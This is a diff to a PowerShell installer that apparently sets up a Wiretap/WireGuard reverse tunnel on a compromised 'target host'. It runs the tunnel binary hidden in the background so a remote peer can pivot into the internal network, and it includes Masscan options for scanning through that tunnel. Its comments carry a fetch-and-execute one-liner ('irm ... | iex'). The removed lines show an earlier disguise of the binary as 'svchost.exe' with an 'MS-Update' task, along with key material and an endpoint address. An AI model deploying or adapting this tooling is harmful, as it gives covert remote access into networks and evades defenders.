@@ -1,13 +1,19 @@
-# # For testing ....
-# $env:X='1-QCM/uHtxKqfGaiascAnP3UNVlO5fa2FeotsFBv15mEs='
-# $env:X+='-cDZxMltJHcVjY+VKcHDpo17ooYBBwkMq6ebZ0R0ZzFs='
-# $env:X+='-136.243.39.18:47007-172.16.0.x/16,fd:16::x/104'
-# $env:DEBUG=""
+# This script sets a WireGuard or Wiretap reverse tunnel on a target host.
+# The X= configuration is supplied by 'curl sf/net/up'. Thereafter:
+# $env:X=<VERSION>-<PRIV>-<PUB>-<ENDPOINT>-<ALLOWED_IPS>
+# irm https://thc.org/sfwg.ps1 | iex
+
+# Variables:
+#
+# $env:DEBUG=1                 Enable debug information and start WT in the foreground
+
+# Test IPv6:
+# curl -I 'http://[2606:4700:4700::1111]'
+# ping6 2606:4700:4700::1111
 
 $GITHUB_REPO="https://api.github.com/repos/sandialabs/wiretap/releases/latest"
 $WT_BIN_NAME="wiretap.exe"
-$WT_BIN_HIDDEN_NAME="svchost.exe"
-$WT_SCHEDULED_TASK_NAME="MS-Update"
+$WT_BIN_HIDDEN_NAME="wiretap.exe"
 $BANNER=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("CgoKCeKjvuKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+KjtwoJ4qO/4qO/4qGP4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qK54qO/4qO/Cgnio7/io7/ioYfioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorjio7/io78KCeKjv+Kjv+Khh+KggOKggOKggOKggOKggOKiuOKjv+Kjv+Kjv+Kjv+Khh+KggOKggOKggOKggOKggOKiuOKjv+KjvwoJ4qO/4qO/4qGH4qCA4qKw4qO24qO24qO24qO+4qO/4qO/4qO/4qO/4qO34qO24qO24qO24qGG4qCA4qK44qO/4qO/Cgnio7/io7/ioYfioIDiorjio7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/ioYfioIDiorjio7/io78KCeKjv+Kjv+Khh+KggOKiuOKjv+Kgv+Kjv+Khv+Kiv+Kjv+Kjv+Khv+Kiv+Kjv+Kgv+Kjv+Khh+KggOKiuOKjv+KjvwoJ4qO/4qO/4qGH4qCA4qK44qO/4qCA4qO/4qGH4qK44qO/4qO/4qGH4qK44qO/4qCA4qO/4qGH4qCA4qK44qO/4qO/Cgnio7/io7/ioYfioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorjio7/io78KCeKjv+Kjv+Kjh+KjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjuOKjv+KjvwoJ4qK/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qG/CgojPT09PT09PSBXaXJldGFwIEluc3RhbGxlciAgPT09PT09PT09Iw==")) | Out-String
 
 function Print-Warning($str)
@@ -126,10 +132,11 @@ function Print-Usage
 {
     Write-Host " `n"
     Print-Warning "Wiretap is not good for scanning."
-    Write-Host "`t===> Masscan   : -e wgExit --adapter-ip 172.16.0.3-172.16.128.2 --adapter-port 1024-33791" -ForegroundColor Yellow
+    Write-Host " └───> Masscan: -e wgExit --adapter-ip 172.16.0.3-172.16.128.2 --adapter-port 1024-33791" -ForegroundColor Yellow
     Write-Host " `n"
     Print-Success "SUCCESS - Wiretap started as $WT_BIN_HIDDEN_NAME in the background."
-    # Write-Host "---> To stop   : ${CDC}${CMD_PKILL} '${killname}'${CN}" -ForegroundColor Red
+    Write-Host " └───> To stop: " -NoNewline
+    Write-Host "taskkill /F /T /FI `"IMAGENAME eq wiretap.exe`"" -ForegroundColor Red
     Write-Host " `n"
 }
 
@@ -146,19 +153,17 @@ function Parse-Config
         Print-Fatal "X= does not contain a valid public key."
     }
 
-    $SF_VER=($CONF[0] -match '//[^0-9]')
-    $PRIV=$CONF[1]
-    $PEER=$CONF[2]
-    $EP=$CONF[3]
-
     try{
-        if ($SF_VER -gt 0) {
-            Print-Fatal "X= contains a bad version number."
-        }
+        $CONF[0] -match '[0-9]' >$null
+        $SF_VER=($Matches[0] -as [int])
+        Print-Debug "SF_VER: $SF_VER"
     }catch{
         Print-Fatal "X= contains a bad version number."
     }
 
+    $PRIV=$CONF[1]
+    $PEER=$CONF[2]
+    $EP=$CONF[3]
 
     ### SF < 0.4.7 compatible
     $env:ADDRESS="192.168.0.1/32"
@@ -183,7 +188,7 @@ function Parse-Config
     Print-Debug "PEER_ADDRES: $env:PEER_ADDRES"
     Print-Debug "PEER_ADDRES6: $env:PEER_ADDRES6"
 
-
+    
     if ($SF_VER -eq 1) {
         Set-Item -Path Env:WIRETAP_INTERFACE_PRIVATEKEY -Value $PRIV
         Set-Item -Path Env:WIRETAP_PEER_PUBLICKEY -Value $PEER
@@ -238,7 +243,6 @@ try {
 try {
     Print-Progress "Unpacking binaries"
     Expand-Archive -Path (Join-Path -Path $WT_PATH -ChildPath "$RAND_NAME.zip") -DestinationPath "$WT_PATH"
-    # tar zx -C "$WT_PATH" -f (Join-Path -Path $WT_PATH -ChildPath "$RAND_NAME.tar.gz") 2>$null
     Print-Ok
 }catch{
     Print-Fail
@@ -261,7 +265,7 @@ try {
 
 try {
     Print-Progress "Testing wiretap binaries"
-    Start-Process -FilePath (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME") -ArgumentList "-h"
+    Start-Process -FilePath (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME") -ArgumentList "-h" >$null
     Print-Ok
 }catch{
     Print-Fail
@@ -275,10 +279,10 @@ try {
     Print-Debug (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME")+"serve --allowed $env:PEER_ADDRESS"
     
     if (-not $env:DEBUG) {
-        Start-Process -FilePath (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME") -ArgumentList "serve", "-q", "--allowed", $env:PEER_ADDRESS -WindowStyle Hidden
+        Start-Process -FilePath (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME") -ArgumentList "serve", "-q", "--conn-timeout", "100", "--allowed", $env:PEER_ADDRESS -WindowStyle Hidden
     }
     else {
-        Start-Process -FilePath (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME") -ArgumentList "serve", "--allowed", $env:PEER_ADDRESS -Wait # -WindowStyle Hidden
+        Start-Process -FilePath (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME") -ArgumentList "serve", "--conn-timeout", "100", "--allowed", $env:PEER_ADDRESS -Wait # -WindowStyle Hidden
     }
     Print-Ok
 }catch{
